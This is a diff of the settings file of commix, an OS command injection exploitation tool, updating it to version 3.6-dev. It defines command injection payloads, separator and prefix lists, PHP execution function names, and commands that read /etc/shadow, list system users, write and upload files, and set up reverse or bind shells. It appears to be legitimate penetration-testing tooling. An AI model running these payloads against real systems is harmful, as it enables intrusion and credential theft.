@@ -20,6 +20,7 @@ import time
 import random
 import string
 import codecs
+from datetime import datetime
 from src.core.compat import xrange
 from src.thirdparty.six.moves import urllib as _urllib
 from src.thirdparty.six.moves import reload_module as _reload_module
@@ -56,74 +57,89 @@ ERROR_SIGN = "[" + Fore.RED + "error" + Style.RESET_ALL  + "] "
 ERROR_BOLD_SIGN = "["  + Style.BRIGHT + Fore.RED + "error" + Style.RESET_ALL  + "] " 
 CRITICAL_SIGN = "[" + Back.RED + "critical" + Style.RESET_ALL  + "] "
 PAYLOAD_SIGN = "[" + Fore.CYAN + "payload" + Style.RESET_ALL + "] " 
-SUB_CONTENT_SIGN = " " * 7 + Fore.GREY + "|_ " + Style.RESET_ALL
+SUB_CONTENT_SIGN = " " * 11 + Fore.GREY + "|_ " + Style.RESET_ALL
+SUB_CONTENT_SIGN_TYPE = Fore.LIGHTRED_EX + " * " + Style.RESET_ALL
 TRAFFIC_SIGN = HTTP_CONTENT_SIGN = ""
 ABORTION_SIGN = ERROR_SIGN 
 DEBUG_SIGN = "[" + Back.BLUE + Fore.WHITE + "debug" + Style.RESET_ALL + "] " 
 DEBUG_BOLD_SIGN = "[" + Back.BLUE + Style.BRIGHT + Fore.WHITE + "debug" + Style.RESET_ALL + "] " + Style.BRIGHT
 CHECK_SIGN = DEBUG_SIGN + "Checking pair of credentials: "
+OS_SHELL_TITLE = Style.BRIGHT + "Pseudo-Terminal Shell (type '?' for available options)" + Style.RESET_ALL
 OS_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """
 REVERSE_TCP_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """
 BIND_TCP_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """
 
-# Print error message
-def print_error_msg(err_msg):
-  result = ERROR_SIGN + str(err_msg) + Style.RESET_ALL
-  return result
-
-# Print error message
-def print_bold_error_msg(err_msg):
-  result = ERROR_BOLD_SIGN + Style.BRIGHT + str(err_msg) + Style.RESET_ALL
-  return result
-
-# Print critical error message
-def print_critical_msg(err_msg):
-  result = CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
-  return result
-
-# Print abortion message
-def print_abort_msg(abort_msg):
-  result = ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
-  return result
-
-# Print warning message
-def print_warning_msg(warn_msg):
-  result = WARNING_SIGN + str(warn_msg) + Style.RESET_ALL
-  return result
-
-# Print warning message
-def print_bold_warning_msg(warn_msg):
-  result = WARNING_BOLD_SIGN + str(warn_msg) + Style.RESET_ALL
-  return result
+def print_time():
+  return "[" + Fore.LIGHTBLUE_EX  + datetime.now().strftime("%H:%M:%S") + Style.RESET_ALL + "] "
 
 # Print legal disclaimer message
 def print_legal_disclaimer_msg(legal_disclaimer_msg):
   result = LEGAL_DISCLAIMER + str(legal_disclaimer_msg) + Style.RESET_ALL
   return result
 
+# Print error message
+def print_error_msg(err_msg):
+  result = print_time() + ERROR_SIGN + str(err_msg) + Style.RESET_ALL
+  return result
+
+# Print error message
+def print_bold_error_msg(err_msg):
+  result = print_time() + ERROR_BOLD_SIGN + Style.BRIGHT + str(err_msg) + Style.RESET_ALL
+  return result
+
+# Print critical error message
+def print_critical_msg(err_msg):
+  result = print_time() + CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
+  return result
+
+# Print abortion message
+def print_abort_msg(abort_msg):
+  result = print_time() + ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
+  return result
+
+# Print warning message
+def print_warning_msg(warn_msg):
+  result = print_time() + WARNING_SIGN + str(warn_msg) + Style.RESET_ALL
+  return result
+
+# Print warning message
+def print_bold_warning_msg(warn_msg):
+  result = print_time() +  WARNING_BOLD_SIGN + str(warn_msg) + Style.RESET_ALL
+  return result
+
+# Print debug message (verbose mode)
+def print_debug_msg(debug_msg):
+  result = print_time() + DEBUG_SIGN + debug_msg + Style.RESET_ALL
+  return result  
+
+# Print bold debug message (verbose mode)
+def print_bold_debug_msg(debug_msg):
+  result = print_time() + DEBUG_BOLD_SIGN + debug_msg + Style.RESET_ALL
+  return result 
+
 # Print request HTTP message
 def print_request_msg(req_msg):
-  result = REQUEST_SIGN + str(req_msg) + Style.RESET_ALL
+  result = print_time() + REQUEST_SIGN + str(req_msg) + Style.RESET_ALL
   return result
 
 # Print response HTTP message
 def print_response_msg(resp_msg):
-  result = RESPONSE_SIGN + str(resp_msg) + Style.RESET_ALL
+  result = print_time() + RESPONSE_SIGN + str(resp_msg) + Style.RESET_ALL
   return result
 
 # Print information message
 def print_info_msg(info_msg):
-  result = INFO_SIGN + str(info_msg) + Style.RESET_ALL
+  result = print_time() + INFO_SIGN + str(info_msg) + Style.RESET_ALL
   return result
 
 # Print bold information message
 def print_bold_info_msg(info_msg):
-  result = INFO_BOLD_SIGN + Style.BRIGHT + str(info_msg) + Style.RESET_ALL
+  result =  print_time() + INFO_BOLD_SIGN + Style.BRIGHT + str(info_msg) + Style.RESET_ALL
   return result
 
 # Print payload (verbose mode)
 def print_payload(payload):
-  result = PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
+  result = print_time() + PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
   return result
 
 # Print HTTP traffic (verbose mode)
@@ -150,8 +166,8 @@ def print_checking_msg(payload):
   return result
 
 # Print question message
-def print_question_msg(question_msg):
-  result = QUESTION_SIGN + question_msg + Style.RESET_ALL
+def print_message(message):
+  result = QUESTION_SIGN + message + Style.RESET_ALL
   return result
 
 # Print sub content message
@@ -159,15 +175,15 @@ def print_sub_content(sub_content):
   result = SUB_CONTENT_SIGN + sub_content + Style.RESET_ALL
   return result
 
-# Print debug message (verbose mode)
-def print_debug_msg(debug_msg):
-  result = DEBUG_SIGN + debug_msg + Style.RESET_ALL
-  return result  
+# Print sub content message
+def print_retrieved_data(cmd, retrieved):
+  result = print_time() + INFO_BOLD_SIGN + Style.BRIGHT + cmd + ": " + str(retrieved) + Style.RESET_ALL
+  return result
 
-# Print bold debug message (verbose mode)
-def print_bold_debug_msg(debug_msg):
-  result = DEBUG_BOLD_SIGN + debug_msg + Style.RESET_ALL
-  return result  
+# Print output of command execution
+def command_execution_output(shell):
+  result = Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
+  return result 
 
 # argv checks
 def sys_argv_checks():
@@ -224,13 +240,17 @@ APPLICATION = "commix"
 DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
-VERSION_NUM = "3.4"
-REVISION = "66"
-STABLE_RELEASE = True
+VERSION_NUM = "3.6"
+REVISION = "32"
+STABLE_RELEASE = False
+VERSION = "v"
 if STABLE_RELEASE:
-  VERSION = "v" + VERSION_NUM + "-stable"
+  VERSION = VERSION + VERSION_NUM + "-stable"
+  COLOR_VERSION = Style.BRIGHT + Style.UNDERLINE + Fore.WHITE + VERSION + Style.RESET_ALL
 else:
-  VERSION = "v" + VERSION_NUM + "-dev#" + REVISION
+  VERSION = VERSION + VERSION_NUM + "-dev#" + REVISION
+  COLOR_VERSION = Style.UNDERLINE + Fore.WHITE + VERSION + Style.RESET_ALL
+
 YEAR = "2014-2022"
 AUTHOR_TWITTER = "@ancst" 
 APPLICATION_URL = "https://commixproject.com" 
@@ -263,6 +283,31 @@ PROXY_REGEX = r"((http[^:]*)://)?([\w\-.]+):(\d+)"
 INJECT_TAG = "INJECT_HERE"
 INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
+
+# Default (windows) target host's python interpreter
+WIN_PYTHON_INTERPRETER = "python.exe"
+USER_DEFINED_PYTHON_DIR = False
+
+# Default (linux) target host's python interpreter
+LINUX_PYTHON_INTERPRETER = "python3"
+USER_DEFINED_PYTHON_INTERPRETER = False
+
+CMD_NUL = ""
+
+#Basic heuristic checks for command injections
+RAND_A = random.randint(1,10000)
+RAND_B = random.randint(1,10000)
+CALC_STRING = str(RAND_A) + "+" + str(RAND_B)
+BASIC_STRING = "(" + CALC_STRING + ")"
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26%26echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
+                                   "|set /a " + BASIC_STRING + "&set /a " + BASIC_STRING
+                                   ]
+ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
+                                   "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
+                                   ]
+BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
+IDENTIFIED_COMMAND_INJECTION = False
 
 #Basic heuristic checks for code injection warnings or... phpinfo page ;)
 PHPINFO_PAYLOAD = "phpinfo()"
@@ -299,6 +344,7 @@ USER_DEFINED_POST_DATA = False
 
 # The wildcard character
 WILDCARD_CHAR = "*"
+WILDCARD_CHAR_APPLIED = False
 
 # Testable parameter(s) - comma separated. 
 TEST_PARAMETER = ""
@@ -320,6 +366,9 @@ LOCAL_HTTP_IP = ""
 
 # Local HTTP server port
 LOCAL_HTTP_PORT = random.randint(50000,60000)
+
+HTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "data", "html"))
+DISABLED_CONTENT_EXTENSIONS = (".py", ".pyc", ".md", ".txt", ".bak", ".conf", ".zip", "~")
 
 # Detection / Exploitation phase(s)
 DETECTION_PHASE = False
@@ -361,8 +410,12 @@ OUTPUT_FILE_NAME = "logs"
 OUTPUT_FILE_EXT = ".txt"
 OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT
 
-# Max Length.
-MAXLEN = "10000"
+# Max Length for command execution output.
+MAXLEN = 10000
+
+STDIN_PARSING = False
+if not sys.stdin.isatty():
+  STDIN_PARSING = True
 
 # Maximum response total page size (trimmed if larger)
 MAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024
@@ -373,32 +426,56 @@ SLOW_TARGET_RESPONSE = 3
 # The testable parameter.
 TESTABLE_PARAMETER = "" 
 
+TESTABLE_VALUE = ""
+
 # The HTTP header name.
 HTTP_HEADER = ""
 
-# The command injection prefixes.
-PREFIXES = ["", " ", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22", "'%26"]
-
 # The command injection separators.
-SEPARATORS = ["", ";", "%3B", "&", "%26", "%1a", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a", "%0d%0a"]
+SEPARATORS = []
+DEFAULT_SEPARATORS = ["", ";", "%26", "|"]
+SPECIAL_SEPARATORS = ["%26%26", "||", "%0a", "%0d%0a", "%1a"]
+SEPARATORS_LVL1 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS  
+SEPARATORS_LVL3 = SEPARATORS_LVL2 = SEPARATORS_LVL1
+
+# The command injection prefixes.
+PREFIXES = []
+PREFIXES_LVL1 = [""]
+PREFIXES_LVL2 = SEPARATORS_LVL1
+PREFIXES_LVL3 = PREFIXES_LVL2 + ["'", "\""] 
 
 # The command injection suffixes.
-SUFFIXES = ["", "'", "\"", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", " #", "//", "\\\\", "%26'", "%27", "%22", "%5C%5C", "%2F%2F"]
+SUFFIXES = []
+SUFFIXES_LVL1 = [""]
+SUFFIXES_LVL2 = SEPARATORS_LVL1
+SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'", "\"", " #", "//", "\\\\"]
 
 # Bad combination of prefix and separator
-JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]
+JUNK_COMBINATION = [SEPARATORS_LVL1[i] + SEPARATORS_LVL1[j] for i in range(len(SEPARATORS_LVL1)) for j in range(len(SEPARATORS_LVL1))]
 
 # Execution functions
-EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]
-
-# The code injection prefixes.
-EVAL_PREFIXES = [".", "{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
+EXECUTION_FUNCTIONS = []
+EXECUTION_FUNCTIONS_LVL1 = ["exec"]
+EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["system", "shell_exec"]
+EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["passthru", "proc_open", "popen"]
 
 # The code injection separators.
-EVAL_SEPARATORS = ["", "%0a", "\\n", "%0d%0a", "\\r\\n"]
+EVAL_SEPARATORS = []
+EVAL_SEPARATORS_LVL1 = [""]
+EVAL_SEPARATORS_LVL2 = EVAL_SEPARATORS_LVL1 + ["%0a"]
+EVAL_SEPARATORS_LVL3 = EVAL_SEPARATORS_LVL2 + ["%0d%0a"]
+
+# The code injection prefixes.
+EVAL_PREFIXES = []
+EVAL_PREFIXES_LVL1 = ["{${", "'.", "."]
+EVAL_PREFIXES_LVL2 = EVAL_PREFIXES_LVL1 + [")'}", "');}"]
+EVAL_PREFIXES_LVL3 = EVAL_PREFIXES_LVL2 + ["\".", "')", "\")", ");}", "\");}", ")", ";", "'", ""] 
 
 # The code injection suffixes.
-EVAL_SUFFIXES = ["", "}}", ".\"", ".'", "", "\\\\", "//", "#", ")}"]
+EVAL_SUFFIXES = []
+EVAL_SUFFIXES_LVL1 = ["}}",  ".'", ""]
+EVAL_SUFFIXES_LVL2 = EVAL_SUFFIXES_LVL1 + ["'#"]
+EVAL_SUFFIXES_LVL3 = EVAL_SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#"]
 
 # The default (url-ecoded) white-space.
 WHITESPACES = ["%20"]
@@ -414,10 +491,14 @@ DELAY = 0
 # Seconds to delay the OS response. (Default 1)
 TIMESEC = 1
 
+# Seconds to delay between each HTTP retry.
+DELAY_RETRY = 1
+
 #Level (Default: 1)
 DEFAULT_INJECTION_LEVEL = 1
 COOKIE_INJECTION_LEVEL = 2
 HTTP_HEADER_INJECTION_LEVEL = 3
+USER_SUPPLIED_LEVEL = DEFAULT_INJECTION_LEVEL
 PERFORM_BASIC_SCANS = True
 
 # Default Temp Directory
@@ -443,15 +524,16 @@ PS_VERSION = "powershell.exe -InputFormat none write-host ([string]$(cmd /c powe
 
 # Current user
 CURRENT_USER = "whoami"
-WIN_CURRENT_USER = "echo %username%"
+WIN_CURRENT_USER = "echo %USERNAME%"
 
 # The hostname
 HOSTNAME = "hostname"
-WIN_HOSTNAME = "echo %computername%"
+WIN_HOSTNAME = "echo %COMPUTERNAME%"
 
-# Check if current user is root
+# Check if current user has excessive privileges
+# Unix-like: root
 IS_ROOT = "echo $(id -u)"
-# Check if current user is admin
+# Windows: admin
 IS_ADMIN = "powershell.exe -InputFormat none [Security.Principal.WindowsBuiltinRole]::Administrator"
 
 # Operation System.
@@ -468,10 +550,18 @@ WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"
 # File System access options
 # Read file
 FILE_READ = "cat "
-WIN_FILE_READ = "type "
+FILE_WRITE_OPERATOR = " > "
+WIN_FILE_WRITE_OPERATOR = "powershell.exe Set-Content "
+WIN_FILE_READ = "powershell.exe get-Content "
+
+# List file
+FILE_LIST = "ls "
+FILE_LIST_WIN = "powershell.exe Test-Path -Path "
+
+CERTUTIL_DECODE_CMD = "certutil -decode "
 
 # Write file
-FILE_WRITE = "echo "
+FILE_WRITE = "printf "
 
 # Write file
 FILE_UPLOAD = "wget "
@@ -483,11 +573,14 @@ SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE
 EVAL_SYS_USERS = "awk -F ':' '{print \$1}{print \$3}{print \$6}' " + PASSWD_FILE 
 
 # Exports users of localgroup
-WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)])"
+WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)]))"
+DEFAULT_WIN_USERS = ["Administrator", "DefaultAccount", "Guest"]
 
 # /etc/shadow
 SHADOW_FILE = "/etc/shadow"
 SYS_PASSES = FILE_READ + SHADOW_FILE 
+
+WIN_REPLACE_WHITESPACE = "-replace('\s+',' '))"
 
 # Accepts 'YES','YE','Y','yes','ye','y'
 CHOICE_YES = ['YES','YE','Y','yes','ye','y']
@@ -509,7 +602,7 @@ AVAILABLE_SHELLS = ["python"]
 
 # Available injection techniques.
 AVAILABLE_TECHNIQUES = [ "c", "e", "t", "f" ]
-
+USER_SUPPLIED_TECHNIQUE = False
 SKIP_TECHNIQUES = False
 
 # User Agent List
@@ -566,7 +659,7 @@ TOR_HTTP_PROXY_PORT = "8118"
 TOR_HTTP_PROXY_SCHEME = "https"
 
 # Cookie injection
-COOKIE_INJECTION = False
+COOKIE_INJECTION = None
 
 # User-Agent injection
 USER_AGENT_INJECTION = None
@@ -580,6 +673,7 @@ HOST_INJECTION = None
 # Custom HTTP Headers injection
 CUSTOM_HEADER_INJECTION = False
 CUSTOM_HEADER_NAME = "" 
+CUSTOM_HEADER_VALUE = "" 
 
 # Valid URL format check
 VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,310})?"
@@ -743,7 +837,7 @@ SERVER_BANNERS = [
 
 # Server banners list
 SERVER_OS_BANNERS = [
-    r"(Microsoft|Windows|Win32)",
+    r"(Microsoft|Windows|Win[\w\.]+)",
     "Debian",
     "Ubuntu",
     "Fedora",
@@ -820,7 +914,7 @@ JSON_LIKE_RECOGNITION_REGEX = r"(?s)\A(\s*\[)*\s*\{.*'[^']+'\s*:\s*('[^']+'|\d+)
 BASE64_RECOGNITION_REGEX = r'^[A-Za-z0-9+/]+[=]{0,2}$'
 
 # Hex encoded characters recognition
-HEX_RECOGNITION_REGEX = r'^[0-9a-f]+'
+HEX_RECOGNITION_REGEX = r'^(0[xX])?[0-9a-fA-F]+$'
 
 # GET parameters recognition
 GET_PARAMETERS_REGEX = r"(.*?)\?(.+)"
@@ -831,14 +925,6 @@ TFB_DECIMAL = False
 # Ignore Error Message
 IGNORE_ERR_MSG = False
 
-# Default (windows) target host's python interpreter
-WIN_PYTHON_INTERPRETER = "python.exe"
-USER_DEFINED_PYTHON_DIR = False
-
-# Default (linux) target host's python interpreter
-LINUX_PYTHON_INTERPRETER = "python3"
-USER_DEFINED_PYTHON_INTERPRETER = False
-
 # Windows PHP installed directory.
 WIN_PHP_DIR = "C:\\xampp\\php\\php.exe"
 USER_DEFINED_PHP_DIR = False
@@ -848,7 +934,7 @@ WIN_COMMENT = "REM"
 COMMENT = "#"
 
 #Delete command
-WIN_DEL = "DEL "
+WIN_DEL = "powershell.exe Remove-Item "
 DEL = "rm "
 
 # Time-based Variables
@@ -904,6 +990,8 @@ HTTP_HEADERS = [ "user-agent", "referer", "host" ]
 
 RAW_HTTP_HEADERS = ""
 
+USER_SUPPLIED_TAMPER = ""
+
 # Tamper scripts dict
 TAMPER_SCRIPTS = {
                   "space2ifs": False,
@@ -922,10 +1010,41 @@ TAMPER_SCRIPTS = {
                   "sleep2timeout": False,
                   "xforwardedfor": False,
                   "dollaratsigns": False,
+                  "printf2echo": False,
                   "uninitializedvariable": False,
                   "slash2env":False,
                   "backticks":False
                  }
+
+UNIX_NOT_SUPPORTED_TAMPER_SCRIPTS = [
+                  "caret",
+                  "space2vtab"
+]
+
+WIN_NOT_SUPPORTED_TAMPER_SCRIPTS = [
+                  "backslashes"
+                  "dollaratsigns",
+                  "backticks",
+                  "nested",
+                  "singlequotes",
+                  "slash2env",
+                  "sleep2usleep",
+                  "printf2echo",
+                  "space2ifs",
+                  "uninitializedvariable"
+]
+
+EVAL_NOT_SUPPORTED_TAMPER_SCRIPTS = [
+                  "backslashes"
+                  "caret",
+                  "dollaratsigns",
+                  "doublequotes",
+                  "nested",
+                  "singlequotes",
+                  "slash2env",
+                  "printf2echo",
+                  "uninitializedvariable"
+]
 
 # HTTP Errors
 BAD_REQUEST = "400"
@@ -939,7 +1058,6 @@ NOT_IMPLEMENTED = "501"
 BAD_GATEWAY = "502"
 SERVICE_UNAVAILABLE = "503"
 GATEWAY_TIMEOUT = "504"
-
 HTTP_ERROR_CODES = [  BAD_REQUEST, 
                       UNAUTHORIZED_ERROR,
                       FORBIDDEN_ERROR,
@@ -976,8 +1094,8 @@ CLI_HISTORY = ""
 # Check for multi encoded payloads
 MULTI_ENCODED_PAYLOAD = []
 
-# Default Timeout
-TIMEOUT = 31
+# Default Timeout (Seconds to wait before timeout connection)
+TIMEOUT = 30
 
 # Retries when the connection timeouts (Default: 3).
 MAX_RETRIES = 3
@@ -1023,7 +1141,7 @@ BLOCKED_IP_REGEX = r"(?i)(\A|\b)ip\b.*\b(banned|blocked|block list|firewall)"
 GOOGLE_ANALYTICS_COOKIE_PREFIX = "__UTM"
 
 # Default path for tamper scripts
-TAMPER_SCRIPTS_PATH = "src/core/tamper/"
+TAMPER_SCRIPTS_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '../',"core/tamper/")) + "/"
 
 # Default path for settings.py file
 SETTINGS_PATH = os.path.abspath("src/utils/settings.py")
@@ -1032,17 +1150,44 @@ SETTINGS_PATH = os.path.abspath("src/utils/settings.py")
 NAGGING_DAYS = 31
 
 LINUX_DEFAULT_DOC_ROOTS = ["/var/www/", "/var/www/html", "/var/www/htdocs", "/usr/local/apache2/htdocs", "/usr/local/www/data", "/var/apache2/htdocs", "/var/www/nginx-default", "/srv/www/htdocs"]  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout
-DEFINED_WEBROOT = False
+DEFINED_WEBROOT = RECHECK_FILE_FOR_EXTRACTION = False
 
 # HTTP Headers
 COOKIE = "Cookie"
 HOST = "Host"
 USER_AGENT = "User-Agent"
 REFERER = "Referer"
-HTTP_ACCEPT_HEADER = "Accept"
+ACCEPT = "Accept"
+ACCEPT_CHARSET = "Accept-Charset"
+ACCEPT_ENCODING = "Accept-Encoding"
+ACCEPT_LANGUAGE = "Accept-Language"
+AUTHORIZATION = "Authorization"
+CACHE_CONTROL = "Cache-Control"
+CONNECTION = "Connection"
+CONTENT_ENCODING = "Content-Encoding"
+CONTENT_LENGTH = "Content-Length"
+CONTENT_RANGE = "Content-Range"
+CONTENT_TYPE = "Content-Type"
+EXPIRES = "Expires"
+IF_MODIFIED_SINCE = "If-Modified-Since"
+IF_NONE_MATCH = "If-None-Match"
+LAST_MODIFIED = "Last-Modified"
+LOCATION = "Location"
+PRAGMA = "Pragma"
+PROXY_AUTHORIZATION = "Proxy-Authorization"
+PROXY_CONNECTION = "Proxy-Connection"
+RANGE = "Range"
+REFERER = "Referer"
+REFRESH = "Refresh"  # Reference: http://stackoverflow.com/a/283794
+SERVER = "Server"
+SET_COOKIE = "Set-Cookie"
+TRANSFER_ENCODING = "Transfer-Encoding"
+VIA = "Via"
+X_POWERED_BY = "X-Powered-By"
+X_DATA_ORIGIN = "X-Data-Origin"
 
 # HTTP Headers values
-HTTP_ACCEPT_HEADER_VALUE = "*/*"
+ACCEPT_VALUE = "*/*"
 
 # Regular expression used for ignoring some special chars
 IGNORE_SPECIAL_CHAR_REGEX = "[^/(A-Za-z0-9.:,_]+"
@@ -1056,6 +1201,31 @@ HTTP_METHOD = ""
 
 DECLARED_COOKIES = ""
 
-CRAWLED_SKIPPED_URLS = 0
+MULTI_TARGETS = False
 
+# Identified Redirect code
+REDIRECT_CODE = ""
+
+# Base64 padding
+BASE64_PADDING = "=="
+
+# Crawling phase
+CRAWLING = CRAWLING_PHASE = False
+CRAWLED_SKIPPED_URLS_NUM = 0
+CRAWLED_URLS_NUM = 0
+
+# Skipped crawled hrefs
+HREF_SKIPPED = []
+
+# Default crawling depth
+DEFAULT_CRAWLING_DEPTH = 1
+
+SITEMAP_CHECK = None
+
+FOLLOW_REDIRECT = False
+
+# Set predefined answers (e.g. "quit=N,follow=N").
+ANSWERS = ""
+
+CHECKING_PARAMETER = ""
 # eof
